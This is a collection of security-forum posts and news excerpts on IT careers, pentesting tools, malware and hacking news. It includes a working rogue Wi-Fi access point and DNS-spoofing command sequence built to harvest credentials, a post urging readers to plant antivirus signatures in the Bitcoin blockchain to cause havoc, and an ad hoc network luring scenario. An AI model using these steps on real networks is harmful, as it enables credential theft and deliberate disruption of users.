1;Hey all, looking for learning adviceey all, im new here and figured this would be the best place to ask this sort of question as everyone else seems to be.  anyhow, a bit of background info: from as far back as i can remember, ive always had a fascination with technology and how things work especially computers. while i was good with them from a young age, it never really truly took form until i was 14 and my mum got the first family pc. within the first six months of tinkering, finding my way around problems, i was already at the stage where i was the unofficial computer guy at school helping teachers fix classroom pcs, sorting out software problems etc.  i had always has a fascination with hackers and was one of the first things i started researching when my mum got the internet.. it wasnt long before i was messing around with trojans doing things i shouldnt be. i never really took it any further as i didnt really have the time alongside my other interests but i was satisfied with impressing my friends.  once i finished school at 16, i was able to get my first job almost straight away as a junior technician for a decent sizes it firm. while i learned a fair bit and initially enjoyed it, i became quite discouraged after quite a few of my older coworkers gave me a really hard time i assumed because of my age. within the first three months, i quit the job and it left a bitter taste in my mouth about pursuing an it career so i left it there.  anyhow ten years on, that interest has been slowly coming back and im now at the stage where i want to pursue an it career again sometime in the not to distant future.  the passion for learning new stuff and tinkering has returned and im very eager to get started however i was hoping for a little guidance and advice  from people on here.  seeing as its been, ive decided to start almost completely from the beginning to fill in all the gaps in my knowledge i have. the only things im confident in is my windows os (not server) knowledge and computer hardware so pretty damn basic. my first three priorities are to get some experience with both windows server, linux and grasp a good understanding of networking to ccna level.  now my biggest problem is that im not much of a bookworm. ive always been a hands on kind of guy and learn much better this way. now books are important and ive already got a few to go through like odoms ccna study guides however despite all the reading i plan on doing, i want to be practicing what im learning as best i can so im not just a walking book.  now i could go out and start buying some cisco equipment and windows server os etc however im fairly certain there are more cost effective solutions such as virtual machines and lab sims. unfortunately though i dont really know much about that sort of stuff yet and was hoping some people could point me in the right direction.  any info would be greatly appreciated

1;Attacking a whole world wide economical communityhe bitcoin database is distributed (non-centralized) and exists on each and every one of the hosts running a bitcoin client. theres a copy of the database on all bitcoin client, thats how the decentralization works. once a transaction is committed, it cant be undone. a bitcoin transmission is stored as an event in the database. you can inject an arbitrary raw 20 byte binary string into the database files (forever) because of that by setting the target address of a transaction to a wanted value (more or less). a bitcoin address (the intended receiver of any amount of coins) consists of 25 bytes. the first one equals 1 by default and is uninteresting. the following 20 bytes identifies the intended receiver and can be set to exactly anything. the following 25 bytes is just a hash of the former 21 bytes. a bitcoin transaktion contains such an address and is stored on each and every bitcoin-client forever. if you delete the database from one bitcoin-client (or has a fresh install), your client will synchronize with the rest of the network. now, imagine that we inject so called "virus signatures" that anti-virus programs recognizes into the bitcoin database. whatll happen is that that will trigger the anti-virus program for every bitcoin client user that has an anti-virus program installed (and this wont go away ever.. you cant clean the database). those virus signatures are harmless in their own, but they are something that anti-virus program use to recognize viruses. the anti-virus programs will think that the local bitcoin database is infected. spamming the bitcoin database with virus signatures will cause havoc. some antivirus-programs will delete the database locally, others will deny their bitcoin-client access to the databases. some wont be able to start their bitcoin-clients again (and cant understand why). some will format and reinstall their computer.. to once again get "infected" when they get a bitcoin client again. panic will spread among computer n00bs. uneducated rumors will spread that bitcoin is spreading viruses. havoc will simply emerge. media will react, and dramatize the thing enormously. the value of bitcoins will drop hasty. all of this just because we send a minimal amount of bitcoins (the smallest amount allowed) to given bitcoin addresses. you can confirm that the injection works by doing the following: brainwallet.org/#converter click on hex on the top, and b58check further down. place an exactly 20 bit hex value there. now you can either send any amount to the bitcoin address that appears in the lower box, and verify that your local bitcoin database soon contains the 20 bytes string of your choise. but you can also take that address and input it into the search box in the upper right of blockchain.info and see that this recipent [your 20 bytes] indeed is addressed exactly as you specified (its called the hash 160) and just trust me that itll be stored exactly so on the physical disk as well. now, how do we know what 20 bytes to send? to make a long story short, ive converted all virus signatures that i could find from an open project  http://www.nlnetlabs.nl/downloads/antiv ... es.strings  into 20 byte long strings and later into bitcoin addresses [all signatures equal to or longer than 20 strings has been used.. the short ones have just been padded with zeros]. if i put all those "viruses" into one file, it causes virus-total to go nuts  http://www.virustotal.com/en/file/ad357 ... 396453693/ imagine having that forever in the bitcoin database files. this is far from being the best you can do with injecting stuff into the bitcoin database (there are for example better virus signatures and alike out there that can be used). but this should work pretty well, and cause a lot of havoc and annoyance. by using the brainwallet.org converter above, you can easily convert the bitcoin addresses to hex and see that those comes solely from the virus definition database. when the coins are sent to those addresses, they are lost forever since nobody owns those addresses. please help spamming the bitcoin database with virus signatures  . pick some address at random, check that it havent been corrupted (use brainwallet and he virus signature list), and send a minimal amount of coins to that address. ive failed miserably at this point, since i lack bitcoins. i thought id have enough by now (ive long fought to get some btc), but aparently it wasnt enough (you need a minimum amount of fractions of a bitcoin to be able to send anything). the addresses are available here: pastebin.com/ct2whuk5 (theres no point in altering those for your own winning sake.. even if you get thousands of those minimal required transaktion amounts.. theyll combined have a value less than the price of a biscuit)
1;Duplicate Vulnerable VMs that have 30 day windows trial.ello all.  i am wondering if anyone has suggestions on software or an automated process that will allow for the same vulnerable vm to be created on different days and allow the 30 day trial to be 30 days with out having to set the new machine up every time you want to send out another vm. the operations systems are obviously windows with vulnerable services and applications for training. i am having a hard time finding anything that will do this, and creating a new vm every time someone requests a vm is way to time consuming.  thanks
3;From Cook to Sys Admin: My Experienceackstory: 2 years ago i was a basic hardware geek who had been building/breaking computers and sohos for most of his life. however, my only adult professions were far from it (cooking, landscaping, warehouse management, etc.) i decided to make a career change because cooking, while fun, has very little room for growth. so i decided to try my hand at a few courses and quickly got my a+ certification. i landed a job at a solar company as an in-house tech and have worked my way through numerous projects, from a full physical network deployment (over 100 ethernet drops) to a full company email host migration (150 users/workstations).  during my time, i have learned a lot, and i have also taken advantage of numerous cbt courses and figured id give my two cents for anyone out there looking to make the same change i did (or just upgrade your skills a bit). testout: i first experienced testout when i attended wgu for a short period. they helped me towards my a+ and provide a very convenient web-based experience. it is very cohesive and rigorously structured. they provide a good amount of content in a variety of ways. specifically, the courses consist of video lectures/white boards, note sheets (summaries of the lectures), and virtual labs. i also took my network+ and mcitp courses with testout through one of their packages. i began to notice some bothersome trends in their material. their instructors were extremely boring. they reminded me of the cliche, socially-inept geek and it seemed as though they only gave these guys a single take for the video cuts. their examples and explanations of concepts were often quizzical and their white-board diagrams were so confusing as to be almost detrimental to the learning experience. i will say , their virtual labs were pretty cool, but were not as numerous as i expected considering it is what they are known for. the note sheets are a life saver and provide tons of content, though youll spend a lot of time just copying notes and trying not to fall asleep to the professors. cbt nuggets: these guys get a lot of praise, and youll see why. i am currently a subscriber because i love using their video lectures for as refreshers. the teachers are not only highly proficient in their trade, but they are engaging to the listener. they teach things in a way that is easy to grasp and each chapter seems specifically designed to flow into the next. now, they dont have any virtual labs or note sheets. your looking at lectures - nothin but. however, the content they provide and the way they provide it (imho) out does all the bells and whistles of testout.  professor messer: similar to cbt nuggets, messer is a gold mine of professional grade knowledge delivered in an up-to-date and easy to grasp format. messers explanation of binary conversion gave me the light bulb which both testout and cbt nuggets failed to instill in me. not to mention its free and there is a good community of students on his forums to source. treehouse: both these classes are specifically designed for designers/programmers. i just began trying these courses out as i am working on developing my design and python skills. so far as i am concerned, they are both great sources for education and skills. treehouse its most definately designed for novices in the field. they spend a lot of time explaining each concept and provide intermittent quizes and projects to instill the code. there is also a solid community of other students and forums where you can actually interact with the teachers themselves. code school is more geared towards the intermediate/advanced students. it is a lot more hand-on training, less lecturing. there isnt a huge community, but the teachers are top-notch and it provides a great platform to hone your skills. i would say start with treehouse and work your way up to code school.  in the end, i would say that personal projects helped me more than any online training. build yourself a cheap file-share server, setup a home domain, trick out your home network. try to land a job as an in-house tech (youll start off getting paid scraps but its worth it for everything you learn in the first 6 months). keep an ideas list and always be working on something.  good luck
0;Getting into Pentestingfound this post on linkedin, i thought it would be interesting to share for anyone who is interested: a lot of people have been asking what it takes to start getting into pen testing and how to go about getting started. i have seen others post on this as well but the questions keep being asked, so either people dont know how to use the googles or dont understand what they are reading. so instead of writing a giant paper on it again i will just post the q&a from my previous discussions. q. what skills do i need to know to become a pen tester? a. this is really a very vague question. i feel to truly be great at pen testing you have to have a good understanding of all the disciplines in cyber. dont worry though if you dont, because no one masters them all. for example, a programmer is going to be able to have a better understanding of the exploits and how they work. they will excel when it comes to tailoring an exploit for a custom scenario (ie. changing the name pipe because a av catches the exploit in its current state). a network admin would have a better understanding of the networks it operates in and be able to have a better understanding of why the network was built the way it was. he will excel at finding the high value targets and understanding admin methodologies. q. where do i go to get started? a. ptes is a great starting point. ( http://www.pentest-standard.org/index.php/main_page ) this gives you a layout of how the pen test should go and what should be completed at each step. it does not reference tools because as we all know, tools come and go, and can be replaced on the fly. q. what do i need to get started? a. first off you need a client, this can prove to be the toughest part as with most clients they will want to see a portfolio. "pro bono" work is always a good start. once you have the client you will need to draft up a scope of work, the easiest way to do this is send them a questionnaire to find out what they are wanting out of the pen test. i have found best to keep it to a small number of questions and keep the questions a simple as possible. once you have a signed statement of work from the client then you can get into the pen testing. for the actual testing i have found using a decently fast laptop to be the best for starting off, i would recommend at least 16gig ram (do to vms and testing), an i7 or equiv processor, and lots of storage. as you grow you can move things off to servers and off load the processing. for wireless engagements you will need a card that can inject traffic, just beware. software you will need (trying to keep costs cheap)... virtualbox, kalilinux, windows box (recommend 8.1 or something running latest version of powershell). you will need something to hold all you data in a centralized point. i recommend lair by fishnetsecurity. mainly because it is free and supports reading data in from msf, nmap, burp, nexpose, nessus, wireshark, p0f, and easily expandable to support others. a pricey alternative is msf pro.. you can get a free trial to check it out ... it is great. q. what other tools should i be familiar with? a. there are so many and everyone has their own arsenal. but here is mine which will focus on pricing. central database: lair by fishnet scanner: nmap with nse scripts, nc for bannering, msf for vulnerability exploitation: msf, cobaltstrike social engineering: whitelightning (google whitelighning bryce kunz), setoolkit, blacksquirrel.io persistence: throwback (google throwback blackhat), beacon (cobaltstrike), poisonivy (this is used by hackers alot, gets flagged alot, but is pretty easy to use and great for showing what hackers can do to a network) enumeration tools: skys the limit, i find searching github to be the best for one off tools. mine is  https://github.com/cr0n1c  and has custom stuff i use as well as forks from others
1;Security of Testing environments and 3rd party integrationm curious how other hosting companies test 3rd party integration in their webapp code. we have separate environments (e.g. dev, test, pre-production, production), but have kept our dev and test environments private as the code being tested isnt always necessarily secure and dont want those environments open to the world. with the need to test 3rd party integration though, developers dont want to wait to test that integration until the code is pushed to production. one idea was secure it at the perimeter and whitelist the ips of the 3rd parties, but not all of the 3rd parties publish the ips being used or if they do, they change enough where managing the whitelist can become a real pain in the butt. what sort of security precautions do other people take to make sure their test environments are kept secure while still being able to test 3rd party integration
3;Good-bye msfpayload and msfencodeheads up for for those that may not be aware, msfpayload and msfencode are being deprecated in favour of msfvenom.  wei chen wrote: greetings all,  on behalf of the metasploits development teams, id like to officially announce the decision of deprecating msfpayload and msfencode. also starting today, we no longer support or accept patches for these two utilities. on june 8th 2015, the elderly msfpayload and msfencode will retire from the metasploit repository, and replaced by their successor msfvenom. the tool msfvenom is the combination of msfpayload and msfencode, and has been in testing for more than 3.5 years.  msfpayload and msfencode have been in service to the hacking community for almost 10 years. whats really remarkable about them is that and theyve been playing a big part in the success of computer hacking on almost every level, offense or defense. as an experienced penetration tester, sometimes maybe you dont necessarily know all the exploits out there publicly, maybe you dont even care because youre such a honey badger, but im pretty sure you would be more than happy to bring a modified executable generated by msfpayload for an on-site gig just in case. if youre just feeling nerdy all the way, you probably "concealed-carry" a msfpayload-generated file on your usb keychain at all times, too. if youre an exploit writer, for fun or profit, even if you dont really write metasploit modules, you probably have used msfpayload to create something for you. if youre just a security enthusiast, maybe youve even used msfpayload to impress your friends.  both msfpayload and msfencode have also had their share in the education and entertainment industry, including:  books ,  on-line tutorials , talks at security conferences, trainings, live interviews,  youtube , etc.  i can spend my entire blog talking about how people use these tools if you let me. but if you have a cool hacking story done with mostly just msfpayload, please do share in the comment section below.  the second remarkable thing about msfpayload and msfencode is the people behind them. since 2005, the tools have been fixed, improved, maintained, and documented by the open source security community. each person has sacrificed their weekends, holidays, quality time with their friends and family to make sure the tools remain working properly. it has not been always easy, and most importantly no contributors have ever asked anything in return. if you ever run into one of these metasploit people at a conference, make sure to buy them a drink.  as we begin the final six-month journey, wed like to encourage you to use the time to become familiar with msfvenom. if you are a tool developer that relies on msfpayload or msfencode, now is a good time to starting making that migration. if youre a trainer, please update your course materials. source:  https://community.rapid7.com/community/ ... d-msfenco
1;PLEASE HELP! Is this the work of a hacker?ello to everyone!  i have a pressing matter and dont know where to go or who to turn to. government agencies offer help, but only at an extremely high price (which im not totally against, just unable to afford). my friend is being terrorized to the point of her contemplating suicide. i hadnt seen or heard from her in 8 months til she showed up at my door looking thin, frail and scared. she sat down with me and started to cry as she explained her situation. she is living in complete fear and everyone "willing" to help is trying to take advantage financially because they know shes desperate. i want to help, but not sure how or where to start.  i will explain the situation the best i can, but first would like to say, im not against putting in hard work and man hours to resolve this. i may not be a hacker, but im not lazy and i do have common sense with above average intelligence. if someone were to offer nothing more than a few appropriate websites with explanations and/or help guides, id be more than appreciative!  ill try to condense this, though ive already been pretty long winded. it all started when my friend (ill call her jen) sat down at her computer to write some emails and files started deleting as she watched. as soon as she would take them out of the recycle bin, they would end up right back in there. she just couldnt move fast enough. she went to her email and saw the same thing. someone was deleting her folders and emails. she tried changing passwords but they were changed again before she could gain control. she then was completely locked out. she waited til the middle of the night to try to recover the lost passwords, but same thing happened before she could make progress. whoever was doing this now had control of her icloud account along  with every email account she had. her phone was under attack too. her incoming and outgoing messages were being changed to say different things. the person responsible had her contacts and was intercepting messages and changing them. she was getting calls and texts from stange numbers and believed her keystrokes were being recorded. they were also tracking her location whenever she left the house. she somehow was able to get into her apple drive where she found folders and folders of text conversations, phone call recordings, screenshots, job login information and gps logs. as soon as she stumbled upon this info, it was being deleted. she just sat there in fear when she realized how much info of hers was compromised. she bought a new router/modem and set it up with her provider so it would be encrypted and secure and also bought a new computer but she was hacked again. she bought a new phone. same thing. the phones shes purchased have been destroyed internally to the point of being inoperable. everything she connects to her network is immediately compromised. she doesnt know how this is happening, especially with security setup on all devices. now, it is worth mentioning that jen has a girlfriend who lives with her. i dont know her girlfriend very well, so i cant say much about her level of computer knowledge.  please, anyone, can you help me so i can help jen? im afraid im going to lose my friend to insanity. she has no clue what this person (or people) wants or what their intentions are. shes living in complete fear in her own home and cant trust anyone around her.. except me, but my knowledge is limited.  is this the work of a hacker? could this be done with spy programs and no hacking abilities? is there a definite place i should start in untangling this whole mess? im just lost. is someone, anyone, willing to take some time out to help me or even lead me in the right path? if so, id be more than grateful.  i apologize for the length of my post and, even if i get no response, i thank you for just listening. i hope everyone is having a wonderful day.  t-wi
1;DNS issues with evil access pointello, i am having some issues in creating an evil access point for a security demonstration and am having some dns issues. essentially what i am doing is broadcasting a fake wireless access point, bridging the connection to my ethernet to allow regular internet access, and spoofing the dns for certain websites, redirecting the use to my own credential harvesting page. i am attempting to do all this through the cli as a proof of concept for constructing a portable evil access point that can basically be dumped somewhere, left to harvest credentials and then collected at a later point and the harvested data dumped to a computer. here is an overview of the scripts i have built to perform this kind of attack: interfaces ========== wlan0 (access point with gateway 192.168.0.1) eth0 (ethernet with internet access, gateway 192.168.1.1) at0 (bridged network interface created by airbase) the following commands are executed in sequence:     code: # start services and monitor mode service apache2 start airmon-ng start wlan0 airmon-ng check kill # start access point airbase-ng -c 11 -e "wifi_gratis" wlan0mon # bring up the bridge, setup the route and run the dhcp server with custom config ifconfig at0 up && ifconfig at0 192.168.0.1 netmask 255.255.255.0 && route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1 && dhcpd # enable port forwarding echo 1 > /proc/sys/net/ipv4/ip_forward && # configure the ip tables iptables -t nat -a prerouting -p udp -j dnat --to 192.168.1.1 ##gateway on eth0 iptables -t nat -a prerouting -p tcp --destination-port 80 -j redirect --to-port 8000 # execute dns spoofing attack on at0 bridged interface dnsspoof -i at0 -f /root/rogueap/dnshosts and here is the config i have written for the dhcp server     code: authoritative; default-lease-time 600; max-lease-time 7200; subnet 192.168.0.0 netmask 255.255.255.0 {    option routers 192.168.0.1;    option subnet-mask 255.255.255.0;    option domain-name-servers 192.168.0.1;    range 192.168.0.2 192.168.0.40; } now, on to the problem. say if i connected to the rogue access point with an iphone device. it connects fine, has access to the internet, but it can only resolve the ip addresses of websites it has visited previously, meaning it cannot perform a dns lookup for a real website, only websites where the dns record has been cached on the device. will i need to enable my own full dns or is there a way to route dns queries directly to the service provider on eth0? i am running the latest 64bit version of kali installed on a notebook with windows 7 dual-boot and an ath9k chipset wireless card
2;FBI: Internet Terror Attack Unlikelyashington (reuters) -- terrorist groups lack the capability to launch a damaging internet-based attack on the united states but foreign governments are probably behind many online spying attempts, fbi officials said on wednesday. al qaeda and other militant groups do not have the ability to disable power plants, airports and other "critical infrastructure" through the internet, said fbi assistant director louis reigel, who heads the enforcement agencys cyber division. "theres nothing on my desk today or the directors desk that would cause any concern today," reigel told reporters in a briefing at fbi headquarters. for full story: http://www.cnn.com/2005/tech/internet/1 ... index.html do
3;Networking Windows XPk, this probably does not belong on this forum, or even this website, but i thought i would give it a go anyways. then again, it is considered hacking.â  i dont know how to explain this easiest, so it will be easy to follow. i am trying to gain access to a network pc with default windows configurations (i have not installed anything on the pc, or changed any settings since i installed windows on the pc). i have the username and password to the account (which is just "administrator" and password is "password", but what can i do once i have it? i have put misc. files all around the pc, and i am trying to view them, but i am having a hard time trying to do so. is it even possible without a complex solution and a lot of free time

2;al-Qaeda Terrorist Hacker Named 007 Exposedor almost two years, intelligence services around the world tried to uncover the identity of an internet hacker who had become a key conduit for al-qaeda. the savvy, english-speaking, presumably young webmaster taunted his pursuers, calling himself irhabi -- terrorist -- 007. he hacked into american university computers, propagandized for the iraq insurgents led by abu musab al-zarqawi and taught other online jihadists how to wield their computers for the cause. suddenly last fall, irhabi 007 disappeared from the message boards. the postings ended after scotland yard arrested a 22-year-old west londoner, younis tsouli, suspected of participating in an alleged bomb plot. in november, british authorities brought a range of charges against him related to that plot. only later, according to our sources familiar with the british probe, was tsoulis other suspected identity revealed. british investigators eventually confirmed to us that they believe he is irhabi 007. for full story: http://www.washingtonpost.com/wp-dyn/co ... 20_pf.html do
2;Hacking Tools That Run on a USB Driveool article i ran across: there have been quite a collection of applications ported to run on usb flash disks. most of these applications seem innocent enough, however some are deliberatly developed to get around it software use policies in the workplace, such as p2p filesharing applications, instant messaging applications, ftp clients and podcast managers to name a few. although these can be seen as a moderate security risk in the wrong hands they are more of a nuisance. however a new breed of applications are making their way to a usb drive near you that you should be more concerned with.  applications which are used by security professionals (and hackers alike) to test the security of their networks and scan for vulnerabilities now have the capability to run independently from a usb flash drive and no longer require that winpcap or other third-party packet capture drivers to be installed on a system. applications such as nmap, ethereal, showtraf, tcpdump, nemesis and john the ripper are now appearing online via sites in a modified form that contain an internal packet driver that is loaded when the application is launched.  what this means is that a hacker no longer needs to even have a laptop with them in order to compromise a network, simply bring a usb flash drive in a company and plug it into the usb drive of an available system. for full story: http://www.watchyourend.com/2006/04/29/ ... umb-drive/ do
2;Did IBM Hack Law Firm Email Server?federal judge is deciding whether to throw out a suit filed by washington, d.c.-based law and lobbying boutique butera & andrews alleging that ibm corp. and an unidentified employee in its durham, n.c., facility tried to hack into its e-mail system.  the firm is suing ibm for attorney fees and more than $60,000 that it paid for outside counsel and to beef up its security.  butera & andrews hired outside consultants after it "became aware of facts which suggested that the e-mail server through which the firm operated had been compromised by unauthorized parties" in november 2005, according to the complaint in-house counsel david hart filed in the u.s. district court for the district of columbia in april.  private investigators identified more than 42,000 attempts to penetrate its e-mail system, which, according to the complaint, could be traced back to e-mail addresses from ibms durham office.  in june, mary ellen powers, managing partner of jones days d.c. office, filed a motion to dismiss on behalf of ibm for failure to state a claim. "the case never should have been brought in the first place," says powers. "ibm had nothing to do with the plaintiff or its e-mail servers, and it has no idea who was trying to hack into its system."  butera & andrews is seeking employment records for the durham office, as well as maintenance logs and administrative rights logs, among other things, for 82 internet protocol addresses that are registered to ibm. the firm argues that this information will help it identify the hacker.  "they have admitted that the computer was owned by them, controlled by them and operated under their supervision," says james butera of butera & andrews.  the suit is awaiting u.s. district judge reggie waltons decision on the motion to dismiss.  original story at: http://www.law.com/jsp/article.jsp?id=1152534923647 do
3;Let’s change the name!e use the terms white hat, grey hat and black hat to describe hackers. black hats are those that don’t follow any ethical guidelines. my problem with this terminology is that it seems to romanticize hackers that are doing a lot of harm.  sort of like that old western films with the good guys being “white hats” and the outlaws being “black hats”.  heck, when i was a kid i sometimes liked playing the part of the outlaw!    i also find that part of the problem is some people involved in security have a secret admiration for the so called black hat hackers.  the reality is this not something cool or makes you l33t or is a victimless crime.  it is now estimated that over 38 million people in the usa have had their identities exposed to cyber criminals.  identity theft in its worse form can be devastating and take many months if not years to repair for some.  those involved with such activities are thieves and criminals. not much better than someone stealing a purse out the hands of an old lady walking down a street.  the battle line is getting drawn more clearly every day and it’s up to people like us to help protect the innocent. yes i know there are a lot of hackers that say “i am not doing any harm. i am just curious and like to poke around.”  i usually respond with “do you mind if i walk into your house and go through your closet and dresser draws?”  i hope i don’t sound like i am standing on a soap box preaching but it’s the way i have come to feel having seen a number of people hurt by cyber criminals
2;Next Generation Rootkits Arrivenew trojan horse is so good at hiding itself that some security researchers claim a new chapter has begun in their battle against malicious-code authors.  the new pest, dubbed "rustock" by symantec and "mailbot.az" by f-secure, uses "rootkit" techniques crafted to avoid the detection technology used by security software, symantec and f-secure said in recent analyses.  "it can be considered the first born of the next generation of rootkits," elia florio, a security response engineer at symantec, wrote in a blog late last month. "rustock.a consists of a mix of old techniques and new ideas that when combined make a malware that is stealthy enough to remain undetected by many rootkit detectors commonly used."  rootkits are considered an emerging threat. they are used to make system changes to hide software, which may be malicious. in the case of rustock or mailbot.az, rootkit technology was used to hide a trojan horse that opens a backdoor on an infected system, putting it at the beck and call of an attacker, according to symantec.  in their continuing race with security software makers, the creators of this latest rootkit appear to have looked closely at the inner workings of detection tools before crafting their malicious code, said craig schmugar, virus research manager at mcafee, which calls the pest "pws-jm."  "security companies are trying to stay one step ahead of the bad guys, but the bad guys already have the technology that is available from the security vendors," he said. "a number of techniques have been combined to really strengthen and harden this particular threat. they have done a pretty good job at closing all the doors."  the mixture of cloaking methods makes rustock "totally invisible on a compromised computer when installed," including on a pc running an early release of windows vista, symantecs florio wrote. "we consider it to be an advanced example of stealth by design malicious code."  to avoid detection, rustock runs no system processes, but runs its code inside a driver and kernel threads, florio wrote. it also uses alternate data streams instead of hidden files and avoids using application programming interfaces (apis). todays detection tools look for system processes, hidden files and hooks into apis, according to florios post. for full story: http://news.com.com/2100-7355_3-6095762 ... &subj=news do
3;What is the worst vulnerability out there?ne could say with some justification that it’s vulnerable systems that have not been updated.  yes that’s very true but that would imply that if every box out there happened to be up to date, running anti-virus and a good firewall, there would be no more hacking. we know that’s not true.   fortunately or unfortunately, depending on what side you are on, and just like there is more than one way to skin a cat, there are a number of ways to slip in.       to me, one of the most dangerous things that has developed is all the unsecured wireless access points out there.  just take an hour and drive around any neighborhood in a reasonably populated city and you will see default installs everywhere! i mentioned this to a security pro once and he responded with “yeah isn’t that great? any time i want to pull off the road and check my email i can!”  i responded with “you know that’s considered theft of bandwidth?” he just leered at me.     it would be so easy to launch any attack i wanted and  it would be completely untraceable! i mean as far as i am concerned.  just find a place to park that’s not too conspicuous and change my mac address just to be safe. then hack away to my hearts content. hmm, maybe send a nasty or threatening email to my local government official? wow, i don’t even have to worry about spoofing my ip or being all that stealth.  the fbi is going to be showing up at this poor fool’s house not mine!      there was a very interesting case in washington dc where a person attempted to blackmail a company by sending emails from several unsecured residential homes. his mistake was that he used the same three places over and over again when he accessed the net to do his blackmail.  the fbi checked out all three homes and realized that the people in those homes couldn’t be connected, so they set up surveillance.  shortly after that they caught the guy sitting outside of one the three houses in his car with his laptop. i feel sorry for the innocent people that came under the scrutiny of the fbi.     there is no reason why manufactures of wireless routers can’t warn consumers in a more substantial way.  package in the box some kind of very obvious warning and tutorial about security.  we as security professionals should do what we can to promote that i think.  ok, i am done and now will get off my soap box

3;The most common password vulnerabilityhe ec council considers good old fashion password cracking as still the best place to focus on.  if there is no exploitable vulnerability or miss configured network, password cracking is still your best place to put your attention.      i am finding that more and more people are getting away from just using a simple dictionary word for their passwords. often they at least add a number to the word, i.e. cherry11.  often those numbers might have a meaning like their birthday. all in all, in my experience cracking passwords with just a simple dictionary attack is getting less productive.  the only good thing is a dictionary attack is fast to do and quickly see if you need to go to stronger methods.        the most common password problem i encounter is not so much that they are so easy to crack, but once you do reveal it, you have access to everything that uses has.  most people use the same password for everything!  what makes that practice a vulnerability is you never know where you might give it up.  sure, the admin is very careful when he logs onto to his server, but is he as careful when he checks his email from my house with my computer?  how many passwords does he maintain, perhaps one or two for everything?  imagine placing a hard ware key logger on the general access computer at the hotel lobby you are staying at and see the results you have.       i am wondering if other pen testers here have had the same experience with the general public.  once you have their password, most everything else they have is yours.  online banking, email, pcanywhere,etc.
2;Consumer Reports: Malware Costs $7.8Bonsumers paid as much $7.8 billion over two years to repair or replace computers that got infected with viruses and spyware, a consumer reports survey found. that figure was down from a similar survey a year ago. still, it suggests that people are paying large sums to cope with the flood of malicious viruses and other programs that can slow computers or render them inoperable.  "there is a very high national cost to this," said jeff fox, technology editor of the consumer magazine. "people think theyre invincible, even when this kind of money is involved."  in a nationwide survey, the magazine found that unwanted commercial e-mail, known as spam, is the biggest computer-securityâ  problem. but viruses are the most expensive, with people paying $5.2 billion in 2004 and 2005 to repair or replace afflicted machines, the survey found.  infections of spyware, a type of software that can track computer users habits or collect sensitive information about them, declined slightly in the past six months, the survey found. but such infections caused almost 1 million u.s. households to replace their computers, the survey found.  losses from phishing scams, which are fake e-mails and web pages that request sensitive data such as bank-account passwords, increased five-fold from the previous survey, with people telling the magazine that such scams cost them $630 million in 2004 and 2005. thats an average loss of $850 per incident.  "phishing scams are worse than theyve ever been," fox said. "the bad guys are getting very sophisticated."  some experts caution, however, that surveys in which people are asked about financial losses can produce overestimates.  "the numbers could possibly be inflated by the way the questions are phrased, especially in an area in which most people arent very articulate," said robert lichter, who runs a statistical center at george mason university in fairfax, va. for full story: http://www.newsfactor.com/story.xhtml?story_id=45613 do
3;[Article]-Anti-Hacker Tool Kit: Reverse Engineering Binariess we move into more advanced ethical hacking topics, the subject always comes up of whether you have to learn programming or not. regardless of which side of the fence you fall, this free chapter from the anti-hacker tool kit, 3rd edition will be a great start. your computer seems to be running slower than normal. the router shows that your computer is transmitting data out to the internet without you knowing it. friends are complaining about you sending them e-mails you never composed. determined to see if you have a trojan running on your computer, you take a look at your process list to see if there is anything out of the ordinary. much to your dismay, you notice a program running that you have never seen before and didnât explicitly start. you have been backdoored by malware.  there are many questions you should be asking in these situations. what does the program do? does it use network resources? can outside hackers now access my computer? am i being used as a zombie for ddos attacks? this chapter will focus on methods and tools you can use to determine what these programs do and how they do them, without having the source code. in the past, reverse engineering was something of a black art. typically it involved some type of decompilation using a tool such as ida or gdb to extract the assembly out of the binary, and the best you could hope for was to have that assembly converted into a low-level c code that you could use to understand what was going on. these tools have evolved, however, and you no longer need a phd in computer science to be able to reverse engineer binaries. that being said, however, a brief primer will go miles in helping you understand when to use certain tools and when to use others.  anti-hacker tool kit: reverse engineering binaries do
1;ad hoc oddnesse and a friend were playing with ad hoc networking from our laptops at school on friday and we found something that might be problematic. ill need to run a few more trials to get a clear understanding of whats going on but heres a preliminary explanation. this is the potential attack scenario: first thing i do is trick someone into connecting to my machine ad hoc. i can do this by using the same ssid as a trusted hotspot and hope they pick mine, or if i know the ssid of one of the accesspoints they connect to automatically, like the router at there house etc, i can use that ssid and as long as were out of range of that router (like at school or a library or something) it will connect to me (this worked with winxp home sp2) ... he wont have an internet connection, as its just an ad hoc connection, im going to try figuring out how to bridge two interfaces to allow for internet connectivity... but regardless... heres the weird part: lets say he turns off his machine... goes for a walk to the park... has a seat at a picnic table... theres no hotspots in range, he opens up his machine not expecting to have any connectivity... maybe he turns his firewall/antivirus off to play some game or something cause he doesnt thnik he has anything to worry about. whats weird is that winxp will automatically start broadcasting that ad hoc network from his machine... i can connect to it, his machine assigns me a 169.254.x.x apipa ip and i have connectivity to hist host! sorry if this post is a little mungy, im on a bus
3;Seven Shortcomings of Virtual Securityoger a. grimes - infoworld mag dont be fooled into thinking virtual security technologies are a panacea for your malware woes ive seen a spate of virtualization products popping up to protect your computer while you surf the internet. roughly similar to sun’s java infamous sandbox environment, they use various mechanisms to prevent malware from infecting or modifying your computer while you browse the web, read e-mail, or use other forms of internet-based communications (im, p-to-p, and so on). i’ve reviewed several of these types of products, including greenborder, linux jail programs, and microsoft windows vista’s file and registry virtualization technology. and many of us often use zen, vmware, or virtual pc virtual machine sessions to safely browse the web.  while each virtualization technology has its benefits, most of the products in this protection class share the same problems -- i could mix and match my criticisms from a single spreadsheet. 1. no sandbox product is foolproof. ive yet to meet one that could not be easily circumvented. so, while they might give you a moderate amount of protection early on, if the sandboxes gain widespread popularity for protecting the masses, they will be hacked and circumvented. it happened to java, and it will happen to vista’s file and registry virtualization protection.  i’ve been able to defeat every product i’ve personally reviewed with minimal effort. the vendors often claim that their products are foolproof and don’t need constant updating “like those sorry anti-virus scanning products.” then i run a battery of malware tests, and usually a well-known worm, spambot, or adware program breaks out of the virtual jail and modifies the host. some take a bit more effort, but all have fallen within an hour of trying.  after one of my successful malware tests, a vendor that previously claimed its product was unbreakable said, “the automated attack had simulated a manual attack, which they didn’t protect against.” excuse me while i try to choke back the reflux!  in my "where windows malware hides" document, i specify more than 130 file and registry locations where malware can hide to spread in windows. most sandbox protection products only protect against a dozen or so file and registry locations.  all os virtual machine products, which might be able to protect all vulnerable locations, can be detected by the bad guys and be circumvented. there are a few products that perform the virtualization outside the host; although these offer additional protection, even they can be detected -- and have their own additional problems, to boot.  read all seven shortcomings here: http://www.infoworld.com/article/06/11/ ... ise_1.html do
